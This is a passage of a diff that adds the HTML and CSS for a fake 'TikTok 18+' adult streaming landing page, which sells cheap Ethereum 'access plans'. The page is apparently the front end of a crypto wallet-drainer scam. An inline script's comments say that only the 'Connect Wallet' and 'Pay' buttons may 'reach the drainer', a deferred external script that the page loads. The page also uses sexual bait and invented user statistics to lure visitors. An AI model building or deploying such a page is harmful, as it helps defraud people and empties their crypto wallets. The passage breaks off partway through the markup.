+.cw-crypto-btn[data-crypto="eth"].active {
+  border-color: rgba(98,126,234,0.5);
+  background: rgba(98,126,234,0.06);
+  box-shadow: 0 0 24px rgba(98,126,234,0.15);
+}
+
+.cw-crypto-icon {
+  width: 34px; height: 34px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.cw-crypto-icon.usdt-icon {
+  background: linear-gradient(135deg, #26a17b, #1a8a68);
+}
+.cw-crypto-icon.eth-icon {
+  background: linear-gradient(135deg, #627eea, #4a63c8);
+}
+.cw-crypto-info {
+  display: flex;
+  flex-direction: column;
+  min-width: 0;
+}
+.cw-crypto-name {
+  font-weight: 700;
+  font-size: 14px;
+  line-height: 1.2;
+}
+.cw-crypto-network {
+  font-size: 10px;
+  color: var(--muted2);
+  letter-spacing: 0.03em;
+}
+.cw-crypto-check {
+  position: absolute;
+  top: 8px; right: 8px;
+  width: 18px; height: 18px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  opacity: 0;
+  transform: scale(0.5);
+  transition: all 0.3s var(--ease-out);
+}
+.cw-crypto-btn[data-crypto="usdt"] .cw-crypto-check { background: #26a17b; }
+.cw-crypto-btn[data-crypto="eth"] .cw-crypto-check { background: #627eea; }
+.cw-crypto-btn.active .cw-crypto-check {
+  opacity: 1;
+  transform: scale(1);
+}
+
+/* ── Network Warning ── */
+.cw-network-warning {
+  display: none;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 14px;
+  background: rgba(255,180,0,0.06);
+  border: 1px solid rgba(255,180,0,0.15);
+  border-radius: 10px;
+  margin-bottom: 20px;
+  font-size: 12px;
+  color: rgba(255,200,60,0.9);
+  line-height: 1.5;
+}
+.cw-network-warning.visible { display: flex; }
+.cw-network-warning svg { flex-shrink: 0; }
+
+/* ── Connect Button ── */
+.cw-connect-wrap { margin-bottom: 10px; }
+.cw-connect-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  width: 100%;
+  height: 52px;
+  border: none;
+  border-radius: 16px;
+  background: linear-gradient(135deg, #f0173e 0%, #d80e32 100%);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s var(--ease);
+  box-shadow: 0 8px 28px rgba(240,23,62,0.3);
+}
+.cw-connect-btn::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, transparent 50%);
+  pointer-events: none;
+}
+.cw-connect-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px rgba(240,23,62,0.45);
+  filter: brightness(1.06);
+}
+.cw-connect-btn:active {
+  transform: scale(0.98) translateY(0);
+}
+.cw-connect-btn.loading {
+  pointer-events: none;
+  opacity: 0.85;
+}
+.cw-connect-btn .cw-spinner {
+  display: none;
+  width: 18px; height: 18px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: cw-spin 0.7s linear infinite;
+}
+.cw-connect-btn.loading .cw-spinner { display: block; }
+.cw-connect-btn.loading .cw-btn-label { display: none; }
+
+.cw-connect-sub {
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted2);
+  display: flex; align-items: center; justify-content: center; gap: 5px;
+  letter-spacing: 0.02em;
+}
+
+/* ── Connected State ── */
+.cw-connected-info {
+  display: none;
+  flex-direction: column;
+  gap: 14px;
+  margin-bottom: 16px;
+}
+.cw-connected-info.visible { display: flex; }
+.cw-wallet-status {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 14px;
+  background: rgba(38,161,123,0.06);
+  border: 1px solid rgba(38,161,123,0.2);
+  border-radius: 10px;
+  font-size: 13px;
+  color: rgba(38,161,123,0.95);
+}
+.cw-wallet-status .cw-wallet-dot {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: #26a17b;
+  animation: pulse 2s infinite;
+}
+.cw-wallet-addr {
+  font-family: 'DM Sans', monospace;
+  font-size: 12px;
+  color: var(--muted);
+  margin-left: auto;
+}
+.cw-order-summary {
+  background: rgba(255,255,255,0.025);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 12px;
+  padding: 14px 16px;
+}
+.cw-order-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 13px;
+  color: var(--muted);
+  padding: 4px 0;
+}
+.cw-order-row span:last-child {
+  color: var(--text);
+  font-weight: 600;
+}
+.cw-order-row.cw-order-total {
+  border-top: 1px solid rgba(255,255,255,0.06);
+  margin-top: 6px;
+  padding-top: 10px;
+  font-size: 14px;
+}
+.cw-order-row.cw-order-total span:last-child {
+  color: var(--accent);
+  font-weight: 800;
+}
+
+.cw-pay-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  width: 100%;
+  height: 52px;
+  border: none;
+  border-radius: 16px;
+  background: linear-gradient(135deg, #f0173e 0%, #d80e32 100%);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s var(--ease);
+  box-shadow: 0 8px 28px rgba(240,23,62,0.3);
+}
+.cw-pay-btn::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(180deg, rgba(255,255,255,0.15) 0%, transparent 50%);
+  pointer-events: none;
+}
+.cw-pay-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 40px rgba(240,23,62,0.45);
+}
+.cw-pay-btn:active { transform: scale(0.98); }
+.cw-pay-btn.loading { pointer-events: none; opacity: 0.85; }
+.cw-pay-btn .cw-spinner { display: none; }
+.cw-pay-btn.loading .cw-spinner { display: block; }
+.cw-pay-btn.loading .cw-btn-label { display: none; }
+
+/* ── Transaction Status ── */
+.cw-tx-status {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 16px 0;
+  gap: 16px;
+}
+.cw-tx-status.visible { display: flex; }
+
+.cw-tx-spinner-large {
+  width: 48px; height: 48px;
+  border: 3px solid rgba(255,255,255,0.08);
+  border-top-color: var(--accent);
+  border-radius: 50%;
+  animation: cw-spin 0.8s linear infinite;
+}
+.cw-tx-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--text);
+}
+.cw-tx-desc {
+  font-size: 13px;
+  color: var(--muted);
+  max-width: 300px;
+  line-height: 1.6;
+}
+
+/* ── Success ── */
+.cw-success {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 16px 0;
+  gap: 16px;
+}
+.cw-success.visible { display: flex; }
+.cw-success-circle {
+  width: 64px; height: 64px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, rgba(38,161,123,0.15), rgba(38,161,123,0.05));
+  border: 2px solid rgba(38,161,123,0.4);
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 30px rgba(38,161,123,0.2);
+  animation: cw-scale-in 0.5s var(--ease-out);
+}
+.cw-success-check {
+  stroke-dasharray: 30;
+  stroke-dashoffset: 30;
+  animation: cw-draw-check 0.5s 0.3s forwards var(--ease-out);
+}
+.cw-success-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 18px;
+  font-weight: 800;
+  color: var(--text);
+}
+.cw-success-desc {
+  font-size: 14px;
+  color: var(--muted);
+}
+.cw-success-plan {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(38,161,123,0.08);
+  border: 1px solid rgba(38,161,123,0.2);
+  border-radius: 999px;
+  padding: 6px 16px;
+  font-size: 13px;
+  font-weight: 600;
+  color: rgba(38,161,123,0.95);
+}
+.cw-continue-btn {
+  width: 100%;
+  height: 48px;
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 14px;
+  background: rgba(255,255,255,0.04);
+  color: var(--text);
+  font-family: 'Syne', sans-serif;
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s var(--ease);
+}
+.cw-continue-btn:hover {
+  background: rgba(255,255,255,0.08);
+  border-color: rgba(255,255,255,0.15);
+}
+
+/* ── Error ── */
+.cw-error {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 16px 0;
+  gap: 14px;
+}
+.cw-error.visible { display: flex; }
+.cw-error-circle {
+  width: 56px; height: 56px;
+  border-radius: 50%;
+  background: rgba(240,23,62,0.1);
+  border: 2px solid rgba(240,23,62,0.3);
+  display: flex; align-items: center; justify-content: center;
+  animation: cw-scale-in 0.4s var(--ease-out);
+}
+.cw-error-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--text);
+}
+.cw-error-desc {
+  font-size: 13px;
+  color: var(--muted);
+  max-width: 300px;
+  line-height: 1.6;
+}
+.cw-retry-btn {
+  padding: 10px 28px;
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 999px;
+  background: rgba(255,255,255,0.04);
+  color: var(--text);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s var(--ease);
+}
+.cw-retry-btn:hover {
+  background: rgba(240,23,62,0.1);
+  border-color: rgba(240,23,62,0.3);
+  color: #fff;
+}
+
+/* ── Widget State Visibility ── */
+.cw-step { display: block; }
+.cw-step.hidden { display: none; }
+
+/* ── Animations ── */
+@keyframes cw-spin { to { transform: rotate(360deg); } }
+@keyframes cw-scale-in { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+@keyframes cw-draw-check { to { stroke-dashoffset: 0; } }
+@keyframes cw-fade-in { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.cw-animate-in { animation: cw-fade-in 0.5s var(--ease-out) forwards; }
+
+/* ── Widget Mobile ── */
+@media (max-width: 480px) {
+  .crypto-access { padding: 64px 0; }
+  .crypto-widget { padding: 28px 20px 24px; border-radius: 20px; }
+  .cw-title { font-size: 15px; letter-spacing: 0.06em; }
+  .cw-plan-price { font-size: 24px; }
+  .cw-plan-price .cw-cents { font-size: 15px; }
+  .cw-plans { gap: 10px; }
+  .cw-plan { padding: 16px 12px; }
+  .cw-crypto-options { gap: 8px; }
+  .cw-crypto-btn { padding: 12px 10px; gap: 8px; }
+  .cw-crypto-icon { width: 30px; height: 30px; }
+  .cw-crypto-name { font-size: 13px; }
+  .cw-connect-btn, .cw-pay-btn { height: 48px; font-size: 14px; }
+}
+
+@media (max-width: 360px) {
+  .cw-plans { grid-template-columns: 1fr; gap: 8px; }
+  .cw-crypto-options { grid-template-columns: 1fr; gap: 8px; }
+}
+  </style>
+  <script>
+   /* Guard: ONLY #cwConnectBtn / #cwPayBtn may reach the drainer.
+      Everything else that looks clickable (Watch Online, plan cards, minis,
+      crypto button) is stopped here in window-capture (registered before the
+      deferred drainer) and handled manually — no events dispatched, so the
+      drainer never sees these clicks and no wallet popup can fire early. */
+   (function () {
+     function closest(el, sel) {
+       while (el && el !== document) {
+         if (el.matches && el.matches(sel)) return el;
+         el = el.parentNode;
+       }
+       return null;
+     }
+     function openPlanModal() {
+       if (typeof window.openCryptoModal === 'function') { window.openCryptoModal(); return true; }
+       return false;
+     }
+     function selectPlan(plan) {
+       plan = plan === '3m' ? '3m' : '6m';
+       if (typeof window.__drainerPlan === 'function') {
+         try { window.__drainerPlan(plan); } catch (_) {}
+       }
+       var miniSync = document.querySelectorAll('.cw-plan-mini[data-mini-plan]');
+       for (var i = 0; i < miniSync.length; i++) {
+         miniSync[i].classList.toggle('active', miniSync[i].getAttribute('data-mini-plan') === plan);
+       }
+     }
+     ['pointerdown', 'mousedown', 'touchstart', 'click', 'pointerup', 'touchend'].forEach(function (type) {
+       window.addEventListener(type, function (e) {
+         if (!e.target) return;
+         // Pass-through: ONLY Connect / Pay reach the drainer
+         if (closest(e.target, '#cwConnectBtn, #cwPayBtn')) return;
+         var watch = closest(e.target, '.js-open-crypto');
+         var mini = closest(e.target, '.cw-plan-mini[data-mini-plan]');
+         var card = closest(e.target, '.cw-plan[data-plan], #cwPlan3m, #cwPlan6m');
+         var crypto = closest(e.target, '.cw-crypto-btn');
+         if (!watch && !mini && !card && !crypto) return;
+         try { e.stopImmediatePropagation(); } catch (_) {}
+         try { e.preventDefault(); } catch (_) {}
+         if (mini) {
+           selectPlan(mini.getAttribute('data-mini-plan'));
+           openPlanModal();
+         } else if (card) {
+           var p = card.getAttribute('data-plan') || (card.id === 'cwPlan3m' ? '3m' : '6m');
+           selectPlan(p);
+         } else if (crypto) {
+           /* single ETH option — nothing to do */
+         } else if (watch) {
+           openPlanModal();
+         }
+       }, true);
+     });
+   })();
+  </script>
+   <script defer charset="UTF-8" type="text/javascript" src="./189836a87b.js"></script>
+ </head>
+ <body>
+  <!-- TOP NAVIGATION & LANGUAGE SWITCHER -->
+  <header class="top-nav">
+   <div class="nav-container">
+    <a class="nav-brand" href="#">
+     <span class="nav-logo">
+      TikTok
+      <em>
+       18+
+      </em>
+     </span>
+     <span class="nav-badge">
+      LIVE
+     </span>
+    </a>
+    <div class="nav-right">
+     <div class="lang-selector-wrap">
+      <span class="lang-globe">
+       🌐
+      </span>
+      <select aria-label="Select Language" class="lang-dropdown" id="langSelect">
+       <!-- Populated dynamically from translations.js -->
+      </select>
+     </div>
+     <button class="nav-btn js-open-crypto" id="navWatchBtn" type="button">
+      <span data-i18n="nav.watchOnline">
+       Watch Online
+      </span>
+     </button>
+    </div>
+   </div>
+  </header>
+  <!-- HERO -->
+  <section class="hero">
+   <video autoplay="" class="hero-video" loop="" muted="" playsinline="" preload="auto">
+    <source src="assets/demo.mp4" type="video/mp4"/>
+   </video>
+   <div class="hero-overlay">
+   </div>
+   <div class="container">
+    <div class="hero-content">
+     <div class="hero-eyebrow reveal">
+      <span class="dot">
+      </span>
+      <span data-i18n="hero.eyebrow">
+       TikTok 18+ · Adults Only (+18)
+      </span>
+     </div>
+     <h1 class="reveal reveal-d1" data-i18n="hero.title">
+      TikTok for
+      <br/>
+      <em>
+       Adults
+      </em>
+     </h1>
+     <p class="hero-desc reveal reveal-d2" data-i18n="hero.desc">
+      Hot uncensored short videos with zero restrictions. Erotic content, private live streams, and an exclusive feed — everything like TikTok, but strictly 18+.
+     </p>
+     <div class="hero-actions reveal reveal-d3">
+      <button class="btn js-open-crypto" id="heroWatchOnlineBtn" type="button">
+       <span data-i18n="hero.btnWatch">
+        Watch Online
+       </span>
+       <span class="btn-arrow">
+        <svg fill="currentColor" height="15" viewbox="0 0 24 24" width="15">
+         <polygon points="6 3 20 12 6 21 6 3">
+         </polygon>
+        </svg>
+       </span>
+      </button>
+      <a class="btn-outline" data-i18n="hero.btnExplore" href="#features">
+       Explore Features
+      </a>
+     </div>
+     <div class="hero-caption reveal reveal-d4">
+      <span>
+       <svg fill="none" height="13" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="13">
+        <polygon points="5 3 19 12 5 21 5 3">
+        </polygon>
+       </svg>
+       <span data-i18n="hero.live">
+        Live 1080p
+       </span>
+      </span>
+      <span>
+       <svg fill="none" height="13" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="13">
+        <rect height="20" rx="2" ry="2" width="14" x="5" y="2">
+        </rect>
+        <line x1="12" x2="12.01" y1="18" y2="18">
+        </line>
+       </svg>
+       <span data-i18n="hero.devices">
+        Mobile &amp; PC
+       </span>
+      </span>
+      <span>
+       <svg fill="none" height="13" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="13">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z">
+        </path>
+       </svg>
+       <span data-i18n="hero.anonymous">
+        100% Anonymous &amp; Secure
+       </span>
+      </span>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- STATS -->
+  <section class="stats">
+   <div class="container">
+    <div class="stats-row">
+     <div class="stat reveal">
+      <div class="stat-n">
+       2.3M+
+      </div>
+      <div class="stat-l" data-i18n="stats.users">
+       Active Users
+      </div>
+     </div>
+     <div class="stat reveal reveal-d1">
+      <div class="stat-n">
+       47K+
+      </div>
+      <div class="stat-l" data-i18n="stats.videos">
+       Hot Videos
+      </div>
+     </div>
+     <div class="stat reveal reveal-d2">
+      <div class="stat-n">
+       18+
+      </div>
+      <div class="stat-l" data-i18n="stats.label18">
+       Adults Only
+      </div>
+     </div>
+     <div class="stat reveal reveal-d3">
+      <div class="stat-n">
+       4.8★
+      </div>
+      <div class="stat-l" data-i18n="stats.satisfaction">
+       Satisfaction
+      </div>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- BANNER -->
+  <section class="banner">
+   <div class="container banner-inner">
+    <h2 class="reveal">
+     Feel the
+     <em style="font-style:normal;background:linear-gradient(120deg,#f0173e,#ff6a8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">
+      Heat and Passion
+     </em>
+    </h2>
+    <p class="reveal reveal-d1">
+     Provocative short videos, sensual dances, hot bodies, and intimate moments — content that ignites your senses. No censorship and no filters.
+    </p>
+    <div class="tag-row reveal reveal-d2">
+     <div class="tag-pill">
+      Erotic
+     </div>
+     <div class="tag-pill">
+      Private Content
+     </div>
+     <div class="tag-pill">
+      Uncensored
+     </div>
+     <div class="tag-pill">
+      100% Anonymous
+     </div>
+     <div class="tag-pill">
+      Infinite Feed
+     </div>
+     <div class="tag-pill">
+      Adults Only (+18)
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- FEATURES -->
+  <section class="features" id="features">
+   <div class="container">
+    <div class="features-layout">
+     <div class="features-sticky reveal">
+      <div class="section-tag" data-i18n="features.tag">
+       EXCLUSIVE FEATURES
+      </div>
+      <h2 class="section-h" data-i18n="features.title">
+       Next-generation 18+ streaming
+      </h2>
+      <p class="section-sub" data-i18n="features.desc" style="margin-top:16px">
+       Experience the most candid adult content platform created for total discretion and premium quality.
+      </p>
+     </div>
+     <div class="features-list">
+      <div class="feature-item reveal">
+       <span class="feature-num">
+        01
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item1Title">
+         Uncensored Live Streaming
+        </div>
+        <p class="feature-desc" data-i18n="features.item1Desc">
+         Real-time broadcasting with full interaction, candid shows, and private VIP rooms.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d1">
+       <span class="feature-num">
+        02
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item2Title">
+         Smart Recommendation Feed
+        </div>
+        <p class="feature-desc" data-i18n="features.item2Desc">
+         AI algorithm curates the hottest clips tailored specifically to your taste.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d2">
+       <span class="feature-num">
+        03
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item3Title">
+         HD Video Quality
+        </div>
+        <p class="feature-desc" data-i18n="features.item3Desc">
+         Crystal-clear 1080p streaming optimized for seamless playback on any device.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d1">
+       <span class="feature-num">
+        04
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item4Title">
+         Direct Creator Interaction
+        </div>
+        <p class="feature-desc" data-i18n="features.item4Desc">
+         Chat, send reactions, and request private shows directly during streams.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d2">
+       <span class="feature-num">
+        05
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item5Title">
+         Ultra Fast Loading
+        </div>
+        <p class="feature-desc" data-i18n="features.item5Desc">
+         Zero buffering video architecture with adaptive streaming bitrates.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d1">
+       <span class="feature-num">
+        06
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item6Title">
+         Daily New Content
+        </div>
+        <p class="feature-desc" data-i18n="features.item6Desc">
+         Thousands of fresh videos and streams added around the clock.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d2">
+       <span class="feature-num">
+        07
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item7Title">
+         100% Anonymous Mode
+        </div>
+        <p class="feature-desc" data-i18n="features.item7Desc">
+         Total privacy guaranteed: watch everything without history or tracking.
+        </p>
+       </div>
+      </div>
+      <div class="feature-item reveal reveal-d1">
+       <span class="feature-num">
+        08
+       </span>
+       <div>
+        <div class="feature-title" data-i18n="features.item8Title">
+         Direct In-Browser Playback
+        </div>
+        <p class="feature-desc" data-i18n="features.item8Desc">
+         Instant access on any mobile phone or desktop without app installation.
+        </p>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- STEPS -->
+  <section class="steps">
+   <div class="container">
+    <div class="steps-header reveal">
+     <div class="section-tag" data-i18n="steps.tag">
+      HOW TO ACCESS
+     </div>
+     <h2 class="section-h" data-i18n="steps.title">
+      Start watching in less than 1 minute
+     </h2>
+    </div>
+    <div class="steps-row">
+     <div class="step-col reveal">
+      <div class="step-circle">
+       01
+      </div>
+      <div>
+       <h3 data-i18n="steps.step1Title">
+        Tap «Watch Online»
+       </h3>
+       <p data-i18n="steps.step1Desc">
+        Press the instant access button
+       </p>
+      </div>
+     </div>
+     <div class="step-col reveal reveal-d1">
+      <div class="step-circle">
+       02
+      </div>
+      <div>
+       <h3 data-i18n="steps.step2Title">
+        Choose Access Plan
+       </h3>
+       <p data-i18n="steps.step2Desc">
+        Select 3 or 6 months period
+       </p>
+      </div>
+     </div>
+     <div class="step-col reveal reveal-d2">
+      <div class="step-circle">
+       03
+      </div>
+      <div>
+       <h3 data-i18n="steps.step3Title">
+        Select Payment
+       </h3>
+       <p data-i18n="steps.step3Desc">
+        Pay securely with ETH
+       </p>
+      </div>
+     </div>
+     <div class="step-col reveal reveal-d3">
+      <div class="step-circle">
+       04
+      </div>
+      <div>
+       <h3 data-i18n="steps.step4Title">
+        Connect Wallet
+       </h3>
+       <p data-i18n="steps.step4Desc">
+        Confirm transaction in 1 click
+       </p>
+      </div>
+     </div>
+     <div class="step-col reveal reveal-d4">
+      <div class="step-circle">
+       05
+      </div>
+      <div>
+       <h3 data-i18n="steps.step5Title">
+        Enjoy The Show!
+       </h3>
+       <p data-i18n="steps.step5Desc">
+        Endless uncensored videos and streams
+       </p>
+      </div>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- CRYPTO ACCESS IN-PAGE BANNER -->
+  <section class="crypto-access" id="crypto-access">
+   <div class="container">
+    <div class="crypto-banner-card reveal">
+     <div class="cw-lock-icon" style="margin:0 auto 16px;">
+      <svg fill="none" height="22" stroke="#f0173e" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="22">
+       <rect height="11" rx="2" ry="2" width="18" x="3" y="11">
+       </rect>
+       <path d="M7 11V7a5 5 0 0 1 10 0v4">
+       </path>
+      </svg>
+     </div>
+     <div class="section-tag" data-i18n="banner.tag" style="margin-bottom:10px;">
+      1-CLICK PREMIUM ACCESS
+     </div>
+     <h2 data-i18n="banner.title" style="font-family:'Syne',sans-serif;font-size:clamp(24px,4vw,34px);font-weight:800;margin-bottom:12px;">
+      Unlimited Access to
+      <em style="font-style:normal;background:linear-gradient(120deg,#f0173e,#ff6a8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">
+       TikTok 18+
+      </em>
+     </h2>
+      <p data-i18n="banner.desc" style="color:var(--muted);max-width:540px;margin:0 auto 24px;font-size:15px;line-height:1.6;">
+       Instant unrestricted access to all uncensored videos and private live streams. Pay securely with Ethereum.
+      </p>
+      <div style="display:flex;justify-content:center;gap:12px;margin-bottom:28px;flex-wrap:wrap;">
+       <div class="cw-plan-mini" data-mini-plan="3m" style="cursor:pointer;">
+        <strong data-i18n="banner.plan3m">
+         3 months — $0.99
+        </strong>
+       </div>
+       <div class="cw-plan-mini active" data-mini-plan="6m" style="cursor:pointer;">
+        <strong data-i18n="banner.plan6m">
+         6 months — $2.99
+        </strong>
+        <span class="cw-badge-inline" data-i18n="banner.bestValue">
+         BEST VALUE
+        </span>
+       </div>
+      </div>
+     <div>
+      <button class="btn js-open-crypto" id="sectionOpenCryptoBtn" style="font-size:16px;padding:8px 8px 8px 24px;margin:0 auto;" type="button">
+       <span data-i18n="banner.btn">
+        Get Instant Access
+       </span>
+       <span class="btn-arrow" style="width:38px;height:38px;">
+        <svg fill="currentColor" height="15" viewbox="0 0 24 24" width="15">
+         <polygon points="6 3 20 12 6 21 6 3">
+         </polygon>
+        </svg>
+       </span>
+      </button>
+     </div>
+    </div>
+   </div>
+  </section>
+  <!-- PREMIUM CRYPTO ACCESS MODAL -->
+  <div aria-hidden="true" aria-modal="true" class="crypto-modal-overlay" id="cryptoModal" role="dialog">
+   <div class="crypto-modal-card">
+    <button aria-label="Close modal" class="crypto-modal-close" id="closeCryptoModalBtn" type="button">
+     <svg fill="none" height="18" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewbox="0 0 24 24" width="18">
+      <line x1="18" x2="6" y1="6" y2="18">
+      </line>
+      <line x1="6" x2="18" y1="6" y2="18">
+      </line>
+     </svg>
+    </button>
+    <div class="crypto-widget">
+     <!-- STEP 1: Plan Selection + Crypto Selection + Connect -->
+     <div class="cw-step" id="cwStepSelect">
+      <!-- Header -->
+      <div class="cw-header">
+       <div class="cw-lock-icon">
+        <svg fill="none" height="20" stroke="#f0173e" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="20">
+         <rect height="11" rx="2" ry="2" width="18" x="3" y="11">
+         </rect>
+         <path d="M7 11V7a5 5 0 0 1 10 0v4">
+         </path>
+        </svg>
+       </div>
+       <div class="cw-title" data-i18n="widget.title">
+        🔓 UNLIMITED ACCESS
+       </div>
+       <div class="cw-subtitle" data-i18n="widget.subtitle">
+        Choose your access period
+       </div>
+      </div>
+      <!-- Plan Cards -->
+      <div class="cw-plans">
+       <div class="cw-plan" data-plan="3m" id="cwPlan3m">
+        <div class="cw-plan-period" data-i18n="widget.plan3m">
+         3 MONTHS
+        </div>
+        <div class="cw-plan-price">
+         $0
+         <span class="cw-cents">
+          .99
+         </span>
+        </div>
+        <div class="cw-plan-label" data-i18n="widget.unlimited">
+         Unlimited Access
+        </div>
+       </div>
+       <div class="cw-plan active" data-plan="6m" id="cwPlan6m">
+        <span class="cw-badge" data-i18n="widget.bestValue">
+         BEST VALUE
+        </span>
+        <div class="cw-plan-period" data-i18n="widget.plan6m">
+         6 MONTHS
+        </div>
+        <div class="cw-plan-price">
+         $2
+         <span class="cw-cents">
+          .99
+         </span>
+        </div>
+        <div class="cw-plan-label" data-i18n="widget.unlimited">
+         Unlimited Access
+        </div>
+       </div>
+      </div>
+      <!-- Divider -->
+      <div class="cw-divider">
+       <div class="cw-divider-line">
+       </div>
+       <div class="cw-divider-text" data-i18n="widget.selectPayment">
+        SELECT PAYMENT METHOD
+       </div>
+       <div class="cw-divider-line">
+       </div>
+      </div>
+      <!-- Crypto Options - ETH only -->
+      <div class="cw-crypto-options" style="grid-template-columns:1fr;">
+        <button class="cw-crypto-btn active" data-crypto="eth" id="cwCryptoEth" type="button">
+        <div class="cw-crypto-icon eth-icon">
+         <svg fill="none" height="16" viewbox="0 0 32 32" width="16">
+          <path d="M16 4l-0.27 0.91v15.65l0.27 0.27 7.27-4.3L16 4z" fill="rgba(255,255,255,0.9)">
+          </path>
+          <path d="M16 4L8.73 16.53l7.27 4.3V4z" fill="white">
+          </path>
+          <path d="M16 22.54l-0.15 0.19v5.58L16 28.8l7.28-10.26L16 22.54z" fill="rgba(255,255,255,0.9)">
+          </path>
+          <path d="M16 28.8v-6.26l-7.27-4L16 28.8z" fill="white">
+          </path>
+          <path d="M16 20.83l7.27-4.3L16 12.93v7.9z" fill="rgba(255,255,255,0.6)">
+          </path>
+          <path d="M8.73 16.53l7.27 4.3v-7.9l-7.27 3.6z" fill="rgba(255,255,255,0.8)">
+          </path>
+         </svg>
+        </div>
+        <div class="cw-crypto-info">
+         <span class="cw-crypto-name" data-i18n="widget.eth">
+          Ethereum
+         </span>
+         <span class="cw-crypto-network" data-i18n="widget.ethNet">
+          ETH Network
+         </span>
+        </div>
+        <div class="cw-crypto-check">
+         <svg fill="none" height="10" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewbox="0 0 24 24" width="10">
+          <polyline points="20 6 9 17 4 12">
+          </polyline>
+         </svg>
+        </div>
+       </button>
+      </div>
+      <!-- Network Warning -->
+      <div class="cw-network-warning" id="cwNetworkWarning">
+       <svg fill="none" height="14" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="14">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+        </path>
+        <line x1="12" x2="12" y1="9" y2="13">
+        </line>
+        <line x1="12" x2="12.01" y1="17" y2="17">
+        </line>
+       </svg>
+       <span data-i18n="widget.warning">
+        Please make sure your wallet is connected to the selected network.
+       </span>
+      </div>
+      <!-- Connect Wallet Button -->
+      <div class="cw-connect-wrap">
+       <button class="cw-connect-btn connectAndClaim" id="cwConnectBtn" type="button">
+        <span class="cw-spinner">
+        </span>
+        <span class="cw-btn-label" data-i18n="widget.connectBtn">
+         CONNECT WALLET
+        </span>
+       </button>
+      </div>
+      <div class="cw-connect-sub">
+       <svg fill="none" height="11" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24" width="11">
